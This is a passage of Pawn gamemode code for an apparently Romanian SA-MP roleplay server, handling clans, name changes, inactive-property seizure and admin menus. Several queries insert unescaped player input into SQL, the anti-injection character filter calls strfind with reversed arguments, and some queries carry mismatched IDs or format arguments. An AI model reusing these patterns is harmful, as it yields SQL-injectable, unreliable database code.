	SendFactionMessage(PlayerInfo[playerid][pMember], COLOR_CLIENT, gString);		
	mysql_format(SQL,gQuery,128,"UPDATE `users` SET `Tester`='%d' WHERE `name`='%s' LIMIT 1", response, sName[playerid]);
	mysql_tquery(SQL,gQuery);
	return true;
}

Dialog:DIALOG_MEMBERS2(playerid, response, listitem, inputtext[]) {
	if(!response) return true;
	new rank = strval(inputtext);
	if rank < 1 || rank > 6 *then 
		return SendClientMessage(playerid, -1, "Rank invalid.");

	format(gString, 128, "%s changed %s's faction rank to %d.", GetName(playerid), sName[playerid], rank);
	SendFactionMessage(PlayerInfo[playerid][pMember], COLOR_CLIENT, gString);	
	_query("UPDATE `users` SET `Rank`='%d' WHERE `name`='%s' LIMIT 1",rank,sName[playerid]);
	format(gString, 60, "Got rank %d.", rank);
	mysql_format(SQL, gQuery, sizeof gQuery, "SELECT * FROM `users` WHERE `name` = '%s' LIMIT 1", sName[playerid]);
	mysql_tquery(SQL, gQuery, #cache_member_account, #ii, playerid, rank);
	return true;
}
redist::cache_member_account(playerid, rank) {
	new userID=-1;
	cache_get_value_name_int(0, "Status", userID);
	if userID!=-1 *then PlayerInfo[userID][pRank] = rank;
	return true;
}

redist::sql_cache_renters(playerid, house) {
	format(gString, 128, "Numele casei: %s\nBalanta: $%s\nChiriasi online: %d", HouseInfo[house][hDiscription], FormatNumber(HouseInfo[house][hTakings]), cache_num_rows());
	ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "Informatii", gString, "Ok", "");
	return true;
}

redist::sql_remove_bizz_inactive(playerid, i) {
	new name[MAX_PLAYER_NAME], userid, Float:hours;
	cache_get_value_name_int(0, "id", userid); 
	cache_get_value_name_float(0, "ConnectedMonth", hours);
	cache_get_value_name(0, "name", name);

	if(hours <= 5) {
		format(gString, 128, "Ai pierdut afacerea #%d deoarece ai avut sub 5 ore jucate in aceasta luna.", i);
		InsertEmail(BizzInfo[i][bOwner], "AdmBot", gString);
		mysql_format(SQL, gQuery, 128, "UPDATE `users` SET `Bizz`='255' WHERE `id`='%d'", userid);
		mysql_tquery(SQL, gQuery);

		BizzInfo[i][bOwned] = 1;					
		BizzInfo[i][bLocked] = 0;
		BizzInfo[i][bBuyPrice] = 0;
		strmid(BizzInfo[i][bOwner], "The State", 0, 24);
		mysql_format(SQL, gQuery, 180, "UPDATE `bizz` SET `Locked`='0',`Owned`='1',`Owner`='The State',`BuyPrice`='0' WHERE `ID`='%d'",BizzInfo[i][bID]);
		mysql_tquery(SQL, gQuery);
		UpdateLabel(2, i);
	}
	return true;
}

redist::sql_sell_house_inactive(playerid, i) {
	new userid, Float:hours, name[MAX_PLAYER_NAME];
	cache_get_value_name_int(0, "id", userid);
	cache_get_value_name_float(0, "ConnectedMonth", hours); 
	cache_get_value_name(0, "name", name);
	if(hours <= 5) {
		format(gString, 128, "Ai pierdut casa #%d deoarece ai avut sub 5 ore jucate in aceasta luna.", i);
		InsertEmail(HouseInfo[i][hOwner], "AdmBot", gString);
		mysql_format(SQL, gQuery, 128, "UPDATE `users` SET `House`='999' WHERE `ID`='%d'", userid);
		mysql_tquery(SQL, gQuery);
		HouseInfo[i][hOwned] = 1;
		HouseInfo[i][hValue] = 0;
		strmid(HouseInfo[i][hOwner], "The State", 0, MAX_PLAYER_NAME);
		mysql_format(SQL, gQuery, 128,"UPDATE `houses` SET `Hel`='0',`Arm`='0',`Lockk`='0',`Owned`='1',`Owner`='The State',`Value`='0' WHERE `ID`='%d'",BizzInfo[i][bID]);
		mysql_tquery(SQL, gQuery);
		UpdateLabel(2, i);
	}
	return true;
}

redist::sql_exist_name(playerid, const inputtext[], bool:x) {
	if(cache_num_rows()) 
		return SendClientMessage(playerid, COLOR_WARNING, "Exista deja un clan inregistrat cu acest nume!");

	if(!x) {
		if(strlen(inputtext) < 3 || strlen(inputtext) > 20) {
			SendClientMessage(playerid, COLOR_GREY, "Numele clanului trebuie sa aiba intre 3 si 20 caractere.");
			ShowPlayerDialog(playerid, DIALOG_CLAN, DIALOG_STYLE_INPUT, "Shop:", "Esti pe cale sa-ti creezi un clan cu 30 locuri disponibile.\nTot ce trebuie sa faci in acest moment,\
		    este sa-ti alegi numele clanului.\nNumele clanului trebuie sa contina intre 3 si 10 caractere.", "Ok", "Back");
			return true;
		}
		if(PlayerInfo[playerid][pPremiumPoints] < 300) return SendClientMessage(playerid, -1, "Nu ai destule Premium Points.");
		ABroadcast(-1, 1, "{00820d}[PENDING >> CLAN] {FFFFFF}%s doreste sa-si cumpere un clan cu numele %s. (/ac %d)", GetName(playerid), inputtext, playerid);
		SCMf(playerid, COLOR_YELLOW, "Clanul '%s' va fi acceptat in momentul in care un admin iti va accepta cererea.", inputtext);
		Iter_Add(report<CLAN>, playerid);
		strmid(ClanRequest[playerid], inputtext, 0, 128);
		request_clan[playerid] = true;
		return true;
	}
	if(strlen(inputtext) < 3 || strlen(inputtext) > 20) return SendClientMessage(playerid, COLOR_GREY, "Numele clanului trebuie sa contina cel putin 3 caractere sau maxim 20!");
	new clanid = PlayerInfo[playerid][pClan];
	if(ClanInfo[clanid][clPremiumPoints] < 200) return SendClientMessage(playerid, COLOR_GREY, "Ai nevoie de 200 premium points in clan pentru aceasta optiune.");
	ClanInfo[clanid][clPremiumPoints] -= 200;		
	format(ClanInfo[clanid][clName], 64, inputtext);
	mysql_format(SQL, gQuery, 128, "UPDATE `clans` SET `Name`='%s' WHERE `ID`='%d'", inputtext, clanid);
	mysql_tquery(SQL, gQuery);
	format(gString, 128, "{%s}[CLAN] %s a schimbat numele clanului in %s.", ClanInfo[clanid][clColor], GetName(playerid), inputtext);
	SendClanMessage(clanid, gString);
	if(ClanInfo[clanid][clHQ] > 0) UpdateLabel(4, ClanInfo[clanid][clHQ]);
	format(gString, 128, "{%s}%s\n%s", ClanInfo[clanid][clColor], ClanInfo[clanid][clName], ClanInfo[clanid][clTag]);
	for(new i = 1; i <= SQL_clanzone; i++) {
	    if(GraffitiInfo[i][gfOwned] == PlayerInfo[playerid][pClan]) SetDynamicObjectMaterialText(GraffitiInfo[i][gfObject], 0, gString, OBJECT_MATERIAL_SIZE_512x256, "BankGothic Md BT", 60, 1, 0xfff0f0f0, 0, OBJECT_MATERIAL_TEXT_ALIGN_CENTER);
	}
	return true;
}
cmd:an(playerid, params[]) {
	if(!IsAdmin(playerid, 1)) 
		return SendClientMessage(playerid, -1, AdminOnly);

	new id;
	if(sscanf(params, "u", id)) 
		return SendClientMessage(playerid, COLOR_GREY, "Syntax: {FFFFFF}/an <playerid/name>");

	if(!IsPlayerConnected(id)) 
		return SendClientMessage( playerid, COLOR_GREY, "That user is not connected." ); 

	if(!request_name[id])
		return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Acel player nu are o solicitare pentru schimbarea numelui!");

	mysql_format( SQL, gString, sizeof gString, "SELECT * FROM `users` WHERE `name` = '%s'", change_name[id]);
	mysql_tquery( SQL, gString, "SQL_change_name", "dd", id, playerid);
	return true; 
}

redist::SQL_change_name(playerid, by) {
	if(cache_num_rows()) {
		if(!forcenamechange[playerid]) ShowPlayerDialog(playerid, DIALOG_CHANGENAME, DIALOG_STYLE_INPUT, "Shop:", "Esti pe cale sa-ti creezi schimbi numele.\nTot ce trebuie sa faci in acest moment, este sa-ti alegi un nume care nu este luat de altcineva.\nLimita este de 3 si 24 caractere.", "Ok", "Back");
		else ShowPlayerDialog(playerid, DIALOG_CHANGENAME, DIALOG_STYLE_INPUT, "Force change name:", "Please enter your desired name below:", "Ok", "Cancel");	
		SendClientMessage(playerid, COLOR_WHITE, "Acest nume este deja luat. Alege-ti altul!");
		return true;
	}

	request_name[playerid] = false;
	Iter_Remove(report<NICKNAME>, playerid);

	if(PlayerInfo[playerid][pHouse] != 999 && PlayerInfo[playerid][pRented] == -1) {
		new houseid = PlayerInfo[playerid][pHouse];
		strmid(HouseInfo[houseid][hOwner], change_name[playerid], 0, strlen(change_name[playerid]));
		mysql_format(SQL, gQuery, 128, "UPDATE `houses` SET `Owner`='%s' WHERE `ID`='%d'", change_name[playerid], houseid);
		mysql_tquery(SQL, gQuery);
		UpdateLabel(1, PlayerInfo[playerid][pHouse]);
	}
	if(PlayerInfo[playerid][pBizz] != 255) {
		new bizid2 = PlayerInfo[playerid][pBizz];
		strmid(BizzInfo[bizid2][bOwner], change_name[playerid], 0, strlen(change_name[playerid]));
		mysql_format(SQL, gQuery, 256, "UPDATE `bizz` SET `Owner`='%s' WHERE `ID`='%d'",change_name[playerid],bizid2);
		mysql_tquery(SQL, gQuery);
		UpdateLabel(2,PlayerInfo[playerid][pBizz]);
	}
	if(PlayerInfo[playerid][pClan] != 0) PlayerInfo[playerid][pTag] = -1;
	foreach(new id : MyVehicle<playerid>) strmid(CarInfo[id][cOwner], change_name[playerid], 0, MAX_PLAYER_NAME);

	mysql_format(SQL, gQuery, 256, "UPDATE `cars` SET `Owner`='%s' WHERE `Userid`='%d'", change_name[playerid], PlayerInfo[playerid][pSQLID]);
	mysql_tquery(SQL, gQuery);
	
	format(gString, 128, "%s si-a schimbat numele in %s pentru 25 Premium Points.", GetName(playerid), change_name[playerid]);
	InsertLog(playerid, gString, LOG_SHOP);

	SetPlayerName(playerid, change_name[playerid]);
	GetPlayerName(playerid, PlayerInfo[playerid][pUsername], MAX_PLAYER_NAME);	

	mysql_format(SQL, gQuery, 256, "UPDATE `users` SET `Name`='%s', `GoldPoints` = '%i' WHERE `id`='%d'", change_name[playerid], PlayerInfo[playerid][pPremiumPoints], PlayerInfo[playerid][pSQLID]);
	mysql_tquery(SQL, gQuery);

	ABroadcast(-1, 1, "{1f7a04}(/an): {FFFFFF}%s i-a schimbat numele lui %s in %s.", GetName(by), GetName(playerid), change_name[playerid]);
	SCMf(playerid, COLOR_YELLOW, "Felicitari! Cererea ta de schimbarea numelui in %s a fost acceptata de un administrator.", GetName(by));
	return true;
}

redist::sql_cache_name_rows(playerid, const inputtext[]) {
	if(cache_num_rows()) {
		if(!forcenamechange[playerid]) ShowPlayerDialog(playerid, DIALOG_CHANGENAME, DIALOG_STYLE_INPUT, "Shop:", "Esti pe cale sa-ti creezi schimbi numele.\nTot ce trebuie sa faci in acest moment, este sa-ti alegi un nume care nu este luat de altcineva.\nLimita este de 3 si 20 caractere.", "Ok", "Back");
		else ShowPlayerDialog(playerid, DIALOG_CHANGENAME, DIALOG_STYLE_INPUT, "Force change name:", "Please enter your desired name below:", "Ok", "Cancel");	
		SendClientMessage(playerid, COLOR_WHITE, "Acest nume este deja luat. Alege-ti altul!");
		return true;
	}
	ABroadcast(-1, 1, "{00820d}(/an): {FFFFFF}%s doreste sa-si schimbe numele in %s. [/an %d]", GetName(playerid), inputtext, playerid);
	request_name[playerid] = true;
	strmid(change_name[playerid], inputtext, 0, 24);
	strmid(HelpText[playerid], inputtext, 0, 128);
	Iter_Add(report<NICKNAME>, playerid);			
	SendClientMessage(playerid, COLOR_YELLOW, "Numele tau va fi schimbat in test in momentul in care un admin iti va accepta cererea.");
	return true;
}

redist::check_clan_grank(playerid, clanid, const inputtext[]) {
	if !cache_num_rows() *then
		return SendClientMessage(playerid, COLOR_GREY, "A aparut o eroare la cautare!");

	new userID;
	cache_get_value_name_int(0, "Status", userID);

	if userID == playerid *then
		return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi aceasta comanda asupra ta!");

	if userID != -1 *then {
		PlayerInfo[userID][pClanRank] = strval(inputtext);
		format(gString, 128, "{%s}[CLAN] %s i-a dat rank %d lui %s.", ClanInfo[clanid][clColor], GetName(playerid), strval(inputtext), sName[playerid]);
	} else format(gString, 128, "{%s}[CLAN] %s i-a dat rank %d lui %s (neconectat).", ClanInfo[clanid][clColor], GetName(playerid), strval(inputtext), sName[playerid]);
	SendClanMessage(clanid, gString);
	_query("UPDATE `users` SET `ClanRank`='%d' WHERE `Name`='%s'", strval(inputtext), sName[playerid]);
	return true;
}

redist::check_clan_tag(playerid, const inputtext[]) {
	if cache_num_rows() *then {
		SendClientMessage(playerid, COLOR_WARNING, "Exista deja un clan inregistrat cu acest TAG!");	
		format(gString, 128, "Numele ales de tine este: %s.\nCel de-al doilea pas, este de a alege tagul clanului.\nTagul clanului trebuie sa contina intre 3 si 9 caractere.", inputtext);
		ShowPlayerDialog(playerid, DIALOG_CLAN2, DIALOG_STYLE_INPUT, "Shop:", gString, "Ok", "");					
		return true;
	}
	if(strlen(inputtext) < 3 || strlen(inputtext) > 6) {
		SendClientMessage(playerid, COLOR_WHITE, "Tagul clanului trebuie sa aiba intre 3 si 9 caractere.");
		format(gString, 128, "Numele ales de tine este: %s.\nCel de-al doilea pas, este de a alege tagul clanului.\nTagul clanului trebuie sa contina intre 3 si 9 caractere.", inputtext);
		ShowPlayerDialog(playerid, DIALOG_CLAN2, DIALOG_STYLE_INPUT, "Shop:", gString, "Ok", "");
		return true;
	}
	new clanid = PlayerInfo[playerid][pClan];
	format(ClanInfo[clanid][clTag], 32, inputtext);
	_query("UPDATE `clans` SET `Tag`='%s' WHERE `ID`='%d'", inputtext, clanid);
	SCMf(playerid, COLOR_ADMCHAT, "Felicitari! Ti-ai cumparat din magazin, un clan cu 10 locuri disponibile.", sSlot[playerid]);
	SCMf(playerid, COLOR_ADMCHAT, "Informatii: Numele clanului este %s (tag: %s). [clan #%d]", ClanInfo[clanid][clName], ClanInfo[clanid][clTag], PlayerInfo[playerid][pClan]);

	finishAchievement(playerid, 32);

	format(ClanInfo[clanid][clRankName1], 32, "Rank 1");
	format(ClanInfo[clanid][clRankName2], 32, "Rank 2");
	format(ClanInfo[clanid][clRankName3], 32, "Rank 3");
	format(ClanInfo[clanid][clRankName4], 32, "Rank 4");
	format(ClanInfo[clanid][clRankName5], 32, "Rank 5");
	format(ClanInfo[clanid][clRankName6], 32, "Rank 6");
	format(ClanInfo[clanid][clRankName7], 32, "Rank 7");
	format(ClanInfo[clanid][clMotd], 32, "None");

	format(gString, 60, "%s%s", ClanInfo[clanid][clTag], PlayerInfo[playerid][pUsername]);
	SetPlayerName(playerid, gString);
	return true;
}
redist::check_tag_clan(playerid, inputtext[]) {
	if cache_num_rows() *then return SendClientMessage(playerid, COLOR_WARNING, "Exista deja un clan inregistrat cu acest TAG!");
	if(!ValidClanTag(inputtext)) return SendClientMessage(playerid, COLOR_GREY, "Tagul trebuie sa contina [ ] sau .");
	if(InvalidClanTag(inputtext)) return SendClientMessage(playerid, COLOR_GREY, "Tagul trebuie sa contina [ ] sau ");		
	if(strlen(inputtext) < 3 || strlen(inputtext) > 10) return SendClientMessage(playerid, COLOR_GREY, "Tagul trebuie sa contina [ ] sau ");
	new clanid = PlayerInfo[playerid][pClan];
	if(ClanInfo[clanid][clPremiumPoints] < 200) return ShowPlayerDialog(playerid, DIALOG_INVALID, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have enough premium points to do this.", "Close", "");
	ClanInfo[clanid][clPremiumPoints] -= 200;		
	format(ClanInfo[clanid][clTag], 64, inputtext);
	mysql_format(SQL, gQuery, 180, "UPDATE `clans` SET `Tag`='%s', `PremiumPoints` = '%i' WHERE `ID`='%d'", inputtext, ClanInfo[clanid][clPremiumPoints], clanid);
	mysql_tquery(SQL, gQuery, "", "");
	format(gString, 180, "{%s}[CLAN] %s a schimbat TAG-ul clanului in %s. (-200 premium points)", ClanInfo[clanid][clColor], GetName(playerid), inputtext);
	SendClanMessage(clanid, gString);
	for(new i = 1; i < SQL_clanzone; i++)
	{
	    if(GraffitiInfo[i][gfOwned] == PlayerInfo[playerid][pClan]) {
			DestroyDynamicObject(GraffitiInfo[i][gfObject]);
			GraffitiInfo[i][gfObject] = CreateDynamicObject(19353, GraffitiInfo[i][gfX], GraffitiInfo[i][gfY], GraffitiInfo[i][gfZ], GraffitiInfo[i][gfRotX], GraffitiInfo[i][gfRotY], GraffitiInfo[i][gfRotZ]);
			format(gString, 128, "{%s}%s\n%s", ClanInfo[GraffitiInfo[i][gfOwned]][clColor], ClanInfo[GraffitiInfo[i][gfOwned]][clName], ClanInfo[GraffitiInfo[i][gfOwned]][clTag]);
		    SetDynamicObjectMaterialText(GraffitiInfo[i][gfObject], 0, gString, OBJECT_MATERIAL_SIZE_512x256, "BankGothic Md BT", 60, 1, 0xfff0f0f0, 0, OBJECT_MATERIAL_TEXT_ALIGN_CENTER);
	    }
	}
	foreach(new i : clan_players<clanid>) {
		if(strlen(PlayerInfo[i][pUsername])+strlen(ClanInfo[clanid][clTag]) >= MAX_PLAYER_NAME) continue;
		switch(PlayerInfo[i][pTag]) {
			case 0: format(gString, 80, "%s%s", ClanInfo[clanid][clTag], PlayerInfo[i][pUsername]);
			case 1: format(gString, 80, "%s%s", PlayerInfo[i][pUsername], ClanInfo[clanid][clTag]);
		}
		SetPlayerName(i, gString);
	}		
	mysql_format(SQL, gQuery, 256, "UPDATE `users` SET `name_and_tag` = CONCAT(`name`, '%s') WHERE `Clan` = '%i'", PlayerInfo[playerid][pClan]);
	mysql_tquery(SQL, gQuery);
	return true;
}

public OnDialogPagesResponse(playerid, dialogid, response, listitem, inputtext[], btn_next_index, btn_previous_index)
{
    switch(dialogid)
    {
        case DIALOG_GARAGE:
        {
            if(listitem == btn_next_index || listitem == btn_previous_index)
            {
                if(listitem == btn_next_index) 
                    ShowPlayerDialogNextPage(playerid); 
                else ShowPlayerDialogPreviousPage(playerid); 
            }
            else 
            {
                if(response)
                {
					new idd = PlayerInfo[playerid][pCarKey][listitem]; gString[0] = (EOS);
					listitemm[playerid] = idd;
					strcat(gString, "Vehicle Info\n");
					if(CarInfo[idd][Spawned] != 0) strcat(gString,"Despawn Vehicle\n");
					else strcat(gString,"Spawn Vehicle\n");
					strcat(gString, "Tow Vehicle\n");
					strcat(gString, "Find Vehicle\n"); 
					strcat(gString, "Buy Insurance\n");
					strcat(gString, "Unstuck Vehicle\n"); 
					strcat(gString, "Sell Vehicle\n");
					strcat(gString, !CarInfo[idd][cVip] ? "Upgrade to VIP Plus ({F7CA18}500 premium points{FFFFFF})\n" : "{FF0000}>> {FFFFFF}Teleport Vehicle\n");
					strcat(gString, "Upgrade to VIP Vehicle ({F7CA18}300 premium points{FFFFFF})\n");
					strcat(gString, "Upgrade to Rainbow Vehicle ({F7CA18}300 premium points{FFFFFF})\n");
					strcat(gString, "Reset KM ({F7CA18}200 premium points{FFFFFF})\n");
					strcat(gString, "Reset Days ({F7CA18}100 premium points{FFFFFF})\n");
					strcat(gString, "{FF0000}Remove tuning");
					if(CarInfo[idd][Confiscated]) strcat(gString, "\n{FFFFFF}Pay fine to TTC");
					Dialog_Show(playerid, personal_vehicles_op, DIALOG_STYLE_LIST, "Options", gString, "Select", "Back");
                }
                ClearDialogPagesData(playerid); //remember to reset player data if dialog completely closed.
            }
        }
    }
    return 1;
}

new const antisqlinjection[][] = {"'","#","`","%","%s","%i","%d","%f"};
public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[]) {
	for(new i,j=sizeof antisqlinjection;i!=j;i++) if(strfind(antisqlinjection[i], inputtext, true) != -1) return true;
	dialogID[playerid] = -1;
	dialogData[playerid][DL_Status]=false;
	new query[256], string[420];
	gString[0] = EOS;
	gQuery[0] = EOS;
    switch(dialogid) {
    	case DIALOG_SPAWNCHANGE_DEP: {
    		if(!response) return callcmd::spawnchange(playerid);

    		switch(listitem) {
    			case 0: {
    				FactionSpawn[playerid] = 1;
    				UpdateVar(playerid, "FactionSpawn", FactionSpawn[playerid]);
    				SCMf(playerid, COLOR_LGREEN, "You will now spawn at %s's HQ.", FactionName(FactionSpawn[playerid]));
    			}
    			case 1:{
    				FactionSpawn[playerid] = 2;
    				UpdateVar(playerid, "FactionSpawn", FactionSpawn[playerid]);
    				SCMf(playerid, COLOR_LGREEN, "You will now spawn at %s's HQ.", FactionName(FactionSpawn[playerid]));
    			}
    			case 2: {
    				FactionSpawn[playerid] = 3;
    				UpdateVar(playerid, "FactionSpawn", FactionSpawn[playerid]);
    				SCMf(playerid, COLOR_LGREEN, "You will now spawn at %s's HQ.", FactionName(FactionSpawn[playerid]));
    			}
    			case 3: {
    				FactionSpawn[playerid] = 14;
    				UpdateVar(playerid, "FactionSpawn", FactionSpawn[playerid]);
    				SCMf(playerid, COLOR_LGREEN, "You will now spawn at %s's HQ.", FactionName(FactionSpawn[playerid]));
    			}
    			case 4: {
    				FactionSpawn[playerid] = 19;
    				UpdateVar(playerid, "FactionSpawn", FactionSpawn[playerid]);
    				SCMf(playerid, COLOR_LGREEN, "You will now spawn at %s's HQ.", FactionName(FactionSpawn[playerid]));
    			}
    		}
    	}
    	case DIALOG_SPAWNCHANGE_SI: {
    		if(!response) return callcmd::spawnchange(playerid);
    		switch(listitem) {
    			case 0: {
    				FactionSpawn[playerid] = 7;
    				UpdateVar(playerid, "FactionSpawn", FactionSpawn[playerid]);
    				SCMf(playerid, COLOR_LGREEN, "You will now spawn at %s's HQ.", FactionName(FactionSpawn[playerid]));
    			}
    			case 1:{
    				FactionSpawn[playerid] = 16;
    				UpdateVar(playerid, "FactionSpawn", FactionSpawn[playerid]);
    				SCMf(playerid, COLOR_LGREEN, "You will now spawn at %s's HQ.", FactionName(FactionSpawn[playerid]));
    			}
    			case 2: {
    				FactionSpawn[playerid] = 21;
    				UpdateVar(playerid, "FactionSpawn", FactionSpawn[playerid]);
    				SCMf(playerid, COLOR_LGREEN, "You will now spawn at %s's HQ.", FactionName(FactionSpawn[playerid]));
    			}
    		}
    	}
    	case DIALOG_SPAWNCHANGE_PARA: {
    		if(!response) return callcmd::spawnchange(playerid);
    		switch(listitem) {
    			case 0: {
    				FactionSpawn[playerid] = 13;
    				UpdateVar(playerid, "FactionSpawn", FactionSpawn[playerid]);
    				SCMf(playerid, COLOR_LGREEN, "You will now spawn at %s's HQ.", FactionName(FactionSpawn[playerid]));
    			}
    			case 1:{
    				FactionSpawn[playerid] = 20;
    				UpdateVar(playerid, "FactionSpawn", FactionSpawn[playerid]);
    				SCMf(playerid, COLOR_LGREEN, "You will now spawn at %s's HQ.", FactionName(FactionSpawn[playerid]));
    			}
    		}
    	}
    	case DIALOG_SPAWNCHANGE_TRAN: {
    		if(!response) return callcmd::spawnchange(playerid);
    		switch(listitem) {
    			case 0: {
    				FactionSpawn[playerid] = 12;
    				UpdateVar(playerid, "FactionSpawn", FactionSpawn[playerid]);
    				SCMf(playerid, COLOR_LGREEN, "You will now spawn at %s's HQ.", FactionName(FactionSpawn[playerid]));
    			}
    			case 1:{
    				FactionSpawn[playerid] = 15;
    				UpdateVar(playerid, "FactionSpawn", FactionSpawn[playerid]);
    				SCMf(playerid, COLOR_LGREEN, "You will now spawn at %s's HQ.", FactionName(FactionSpawn[playerid]));
    			}
    			case 2: {
    				FactionSpawn[playerid] = 23;
    				UpdateVar(playerid, "FactionSpawn", FactionSpawn[playerid]);
    				SCMf(playerid, COLOR_LGREEN, "You will now spawn at %s's HQ.", FactionName(FactionSpawn[playerid]));
    			}
    		}
    	}
    	case DIALOG_SPAWNCHANGE_TTC: {
    		if(!response) return callcmd::spawnchange(playerid);
    		switch(listitem) {
    			case 0: {
    				FactionSpawn[playerid] = 8;
    				UpdateVar(playerid, "FactionSpawn", FactionSpawn[playerid]);
    				SCMf(playerid, COLOR_LGREEN, "You will now spawn at %s's HQ.", FactionName(FactionSpawn[playerid]));
    			}
    			case 1:{
    				FactionSpawn[playerid] = 22;
    				UpdateVar(playerid, "FactionSpawn", FactionSpawn[playerid]);
    				SCMf(playerid, COLOR_LGREEN, "You will now spawn at %s's HQ.", FactionName(FactionSpawn[playerid]));
    			}
    		}
    	}
    	case DIALOG_CONFIRM: {
    		switch(SelectedItem[playerid]) {
    			case 0: {
    				SendClientMessage(playerid, -1, "{47a033}(SHOP INFO) {D7FFB3}Ai achizitionat packetul Starter si ai primit: VIP & Premium Account, iPhone si $10,000,000. (-1000 premium points)");
		            GivePlayerCash(playerid, 10000000);
		         	PlayerInfo[playerid][pPremiumPoints] -= 1000;
				    ShowPlayerDialog(playerid, DIALOG_NEWNUMBER, DIALOG_STYLE_INPUT, "{FFFFFF}Shop:", "{FFFFFF}Esti pe cale sa-ti achizitionezi un iPhone.\n{FFFFFF}Tot ce trebuie sa faci in acest moment, este sa-ti alegi un numar format din 4 cifre.\n\n{FFFFFF}Link numere libere: {FF0000}https://panel.b-hood.ro/general/freenumbers", "Select", "");
				    PlayerInfo[playerid][pPremiumAccount]=PlayerInfo[playerid][pVip]=PlayerInfo[playerid][pBackpack] = 1;
					_query("UPDATE `users` SET `Vip`='1',`Backpack`='1',`Premium`='1' WHERE `id`='%i'", PlayerInfo[playerid][pSQLID]);
					SetPlayerAttachedObject(playerid, 8, 3026, 1, -0.172813, -0.112569, -0.022387, 0.000000, 0.000000, 3.390071, 1.000000, 1.000000, 1.130721);
					format(string, sizeof(string), "%s si-a achizitionat un Starter Pack pentru suma de 1000 Premium Points.", GetName(playerid));
					InsertLog(playerid, string, LOG_SHOP);
    			}
    		}
    	}
    	case DIALOG_CLAN_REMOVET: {
    		if(!response) return true;
    		new vsid = PersonalClanCar(playerid);

    		new car = CarInfo[vsid][Spawned];
			for(new i = 0; i < 14; i++) {
				if(CarInfo[vsid][cMod][i] != 0) RemoveVehicleComponent(car, CarInfo[vsid][cMod][i]);
				CarInfo[vsid][cMod][i] = 0;
			}
			CarInfo[vsid][paintjob] = 3;
			ChangeVehiclePaintjob(CarInfo[vsid][Spawned], 3);
			gString[0] = (EOS);
			mysql_format(SQL, gString, 128, "UPDATE `cars` SET `Mods`='%i %i %i %i %i %i %i %i %i %i %i %i %i %i' WHERE `ID`='%i'", CarInfo[vsid][cMod][0], CarInfo[vsid][cMod][1], CarInfo[vsid][cMod][2],
				CarInfo[vsid][cMod][3], CarInfo[vsid][cMod][4], CarInfo[vsid][cMod][5], CarInfo[vsid][cMod][6], CarInfo[vsid][cMod][7], CarInfo[vsid][cMod][8], CarInfo[vsid][cMod][9],
				CarInfo[vsid][cMod][10], CarInfo[vsid][cMod][11], CarInfo[vsid][cMod][12], CarInfo[vsid][cMod][13], CarInfo[vsid][cID]);
			mysql_tquery(SQL, gString);
			mysql_format(SQL, query, sizeof(query), "UPDATE `cars` SET `paintjob`='%d' WHERE `ID`='%d'",CarInfo[vsid][paintjob], CarInfo[vsid][cID]);
			mysql_tquery(SQL, query, "", "");		

    		SendClientMessage(playerid, 0xFFADADFF, "Updated changes!");
    	}
    	case DIALOG_STAFF_ADMINS: {
    		if(!response) return true;
    		format(sName[playerid], MAX_PLAYER_NAME, Selected[playerid][listitem]);	
			mysql_format(SQL, gQuery, 128, "SELECT * FROM `users` WHERE `name`='%s'", sName[playerid]);
			mysql_tquery(SQL, gQuery, "cache_sql_staff_adm_manage", "i", playerid);
    	}
    	case DIALOG_GO: {
    		if(response) switch(listitem) {
		        case 0: ShowPlayerDialog(playerid, DIALOG_GO1, DIALOG_STYLE_LIST, "SERVER: House Interiors", "Madd Doggs'\nCJ's House\nRyder's House\nTiger Skin Brothel\nColonel Fuhrberger's\nCrack Den\nDenise's Room\nKatie's Room\nBig Interior\nBig Safe House", "Select", "Cancel");
		        case 1: ShowPlayerDialog(playerid, DIALOG_GO2, DIALOG_STYLE_LIST, "SERVER: Race Tracks", "Dirt Track\nVice Stadium\nBloodbowl Stadium\n8-Track Stadium\nKickstart Stadium", "Select", "Cancel");
		        case 2: ShowPlayerDialog(playerid, DIALOG_GO3, DIALOG_STYLE_LIST, "SERVER: City Locations", "Los Santos\nSan Fierro\nLas Venturas", "Select", "Cancel");
		        case 3: ShowPlayerDialog(playerid, DIALOG_GO4, DIALOG_STYLE_LIST, "SERVER: Popular Locations", "Bank (exterior)\nGym (exterior)\nAll Saints Hospital\nCounty General Hospital\nNewbie Spawn\n", "Select", "Cancel");
		        case 4: ShowPlayerDialog(playerid, DIALOG_GO5, DIALOG_STYLE_LIST, "SERVER: Gym Interiors", "Ganton Gym (LS)\nCobra Martial Arts (SF)\nBelow the Belt Gym (LV)", "Select", "Cancel");
		        case 5: ShowPlayerDialog(playerid, DIALOG_GO6, DIALOG_STYLE_LIST, "SERVER: Other Locations", "RC Battlefield\nArea 69\nWarehouse 1\nWarehouse 2\nMeat Factory\nSherman Dam\n", "Select", "Cancel");
		    }
    	}
    	case DIALOG_GO1: {
			if(response) switch(listitem) {
			    case 0: {
			        SetPlayerVirtualWorld(playerid, 0);
			        SetPlayerInterior(playerid, 5);
			        SetPlayerPos(playerid, 1267.663208, -781.323242, 1091.906250);
			        ABroadcast(COLOR_LIGHTRED, 1, "(/go): {FFFFFF}Admin %s teleported to 'Madd Doggs'.", GetName(playerid));
			    }
			    case 1: {
			        SetPlayerVirtualWorld(playerid, 0);
			        SetPlayerInterior(playerid, 3);
			        SetPlayerPos(playerid, 2496.049804, -1695.238159, 1014.742187);
			        ABroadcast(COLOR_LIGHTRED, 1, "(/go): {FFFFFF}Admin %s teleported to 'CJ s House'.", GetName(playerid));
			    }
			    case 2: {
			        SetPlayerVirtualWorld(playerid, 0);
			        SetPlayerInterior(playerid, 2);
			        SetPlayerPos(playerid, 2454.717041, -1700.871582, 1013.515197);
			        ABroadcast(COLOR_LIGHTRED, 1, "(/go): {FFFFFF}Admin %s teleported to 'Ryder s House'.", GetName(playerid));
			    }
			    case 3: {
			        SetPlayerVirtualWorld(playerid, 0);
			        SetPlayerInterior(playerid, 3);
			        SetPlayerPos(playerid, 964.106994, -53.205497, 1001.124572);
			        ABroadcast(COLOR_LIGHTRED, 1, "(/go): {FFFFFF}Admin %s teleported to 'Tiger Skin Brothel'.", GetName(playerid));
			    }
			    case 4: {
			        SetPlayerVirtualWorld(playerid, 0);
			        SetPlayerInterior(playerid, 8);
			        SetPlayerPos(playerid, 2807.619873, -1171.899902, 1025.570312);
